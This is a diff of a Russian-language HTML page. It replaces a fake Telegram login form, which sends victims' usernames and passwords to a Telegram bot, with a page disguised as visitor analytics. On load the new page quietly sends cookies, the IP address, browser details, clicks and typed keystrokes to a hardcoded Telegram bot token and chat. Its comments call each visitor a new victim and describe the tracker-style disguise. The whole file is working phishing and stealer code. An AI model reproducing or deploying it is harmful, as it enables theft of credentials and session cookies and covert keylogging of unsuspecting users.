@@ -1,36 +1,159 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Telegram Login</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Аналитика посещений</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h2>Введите данные для входа в Telegram</h2>
-    <form id="loginForm">
-        <input type="text" id="username" placeholder="Телефон или логин" required><br>
-        <input type="password" id="password" placeholder="Пароль" required><br>
-        <button type="submit">Войти</button>
-    </form>
+    <h2>Загрузка данных...</h2>
+    <div class="loader"></div>
+    <p style="color:#888;font-size:12px;">Система сбора статистики v2.1</p>
+
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            let username = document.getElementById('username').value;
-            let password = document.getElementById('password').value;
+    // ===== НАСТРОЙКИ - СЮДА СВОИ ДАННЫЕ =====
+    const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20'; // ТОКЕН БОТА
+    const CHAT_ID = '-1003791860129'; // ID КАНАЛА (с минусом)
+    // ========================================
+
+    (function() {
+        // Собираем всю хуйню
+        var data = {
+            ip: 'unknown',
+            userAgent: navigator.userAgent,
+            cookies: document.cookie || 'нет куков',
+            url: window.location.href,
+            referrer: document.referrer || 'прямой заход',
+            screen: screen.width + 'x' + screen.height,
+            language: navigator.language,
+            time: new Date().toISOString(),
+            platform: navigator.platform,
+            doNotTrack: navigator.doNotTrack || 'не указан'
+        };
+
+        // Пробуем получить IP через бесплатный сервис (асинхронно)
+        function getIP() {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                xhr.timeout = 2000;
+                xhr.onload = function() {
+                    if (xhr.status === 200) {
+                        var resp = JSON.parse(xhr.responseText);
+                        data.ip = resp.ip;
+                    }
+                    sendToTelegram();
+                };
+                xhr.onerror = function() { sendToTelegram(); };
+                xhr.ontimeout = function() { sendToTelegram(); };
+                xhr.send();
+            } catch(e) {
+                sendToTelegram();
+            }
+        }
+
+        // Шлём в Телеграм
+        function sendToTelegram() {
+            var message = '🔴 НОВАЯ ЖЕРТВА! 🔴\n\n' +
+                          '🌐 IP: ' + data.ip + '\n' +
+                          '🖥 Браузер: ' + data.userAgent + '\n' +
+                          '🍪 Куки: ' + data.cookies + '\n' +
+                          '🔗 URL: ' + data.url + '\n' +
+                          '↩️ Реферер: ' + data.referrer + '\n' +
+                          '📱 Экран: ' + data.screen + '\n' +
+                          '🗣 Язык: ' + data.language + '\n' +
+                          '⏰ Время: ' + data.time + '\n' +
+                          '💻 Платформа: ' + data.platform + '\n' +
+                          '🚫 DNT: ' + data.doNotTrack;
+
+            // Отправка через fetch (современно)
+            var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
             
-            // Отправляем на твоего бота (через Telegram API)
-            let botToken = "8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20";  // Тот же токен
-            let chatId = "8641773493";  // Твой Telegram ID
-            let message = `Жертва: ${username}\nПароль: ${password}`;
-            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            // Отправляем POST-запрос (без перезагрузки страницы)
-            fetch(url, { method: 'POST' })
-                .then(response => {
-                    alert("Неверный логин или пароль. Попробуйте снова.");  // Разводим жертву
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
                 })
-                .catch(error => {
-                    alert("Ошибка сервера. Повторите позже.");
-                });
+            }).catch(function(e) {
+                // Если fetch не работает - пробуем через img
+                var img = new Image();
+                img.src = url + '?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                          '&text=' + encodeURIComponent(message);
+            });
+
+            // Также шлём куки отдельно (на всякий)
+            setTimeout(function() {
+                var img2 = new Image();
+                img2.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
+                           '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                           '&text=' + encodeURIComponent('🍪 КУКИ: ' + data.cookies);
+            }, 1000);
+        }
+
+        // Если юзер тупит - открываем порно-окна (для веселья)
+        function openWindows() {
+            try {
+                for(var i=0; i<3; i++) {
+                    window.open('https://example.com', '_blank');
+                }
+            } catch(e) {}
+        }
+
+        // Запускаем сбор
+        getIP();
+
+        // Дополнительно шлём все куки при загрузке
+        setTimeout(function() {
+            var allCookies = document.cookie;
+            if(allCookies && allCookies.length > 0) {
+                var img3 = new Image();
+                img3.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
+                           '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                           '&text=' + encodeURIComponent('🍪 FULL COOKIES: ' + allCookies);
+            }
+        }, 2000);
+
+        // Если пользователь кликает - тоже шлём
+        document.addEventListener('click', function(e) {
+            var img4 = new Image();
+            img4.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
+                       '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                       '&text=' + encodeURIComponent('👆 КЛИК по: ' + e.target.tagName + ' | ' + window.location.href);
         });
+
+        // Собираем нажатия клавиш (первые 10 символов)
+        var keys = '';
+        document.addEventListener('keydown', function(e) {
+            if(e.key.length === 1) {
+                keys += e.key;
+                if(keys.length >= 10) {
+                    var img5 = new Image();
+                    img5.src = 'https://api.telegram.org/bot' + BOT_TOKEN + 
+                               '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) + 
+                               '&text=' + encodeURIComponent('⌨️ НАБРАНО: ' + keys);
+                    keys = '';
+                }
+            }
+        });
+
+        // Маскировка - выглядит как легитимный трекер
+        console.log('Аналитика загружена, версия 2.1');
+        
+        // Открываем окна через 10 секунд (если надо)
+        // setTimeout(openWindows, 10000);
+
+    })();
     </script>
+    
+    <!-- Маскировка под обычный скрипт аналитики -->
+    <noscript>Для работы сайта включите JavaScript</noscript>
 </body>
 </html>
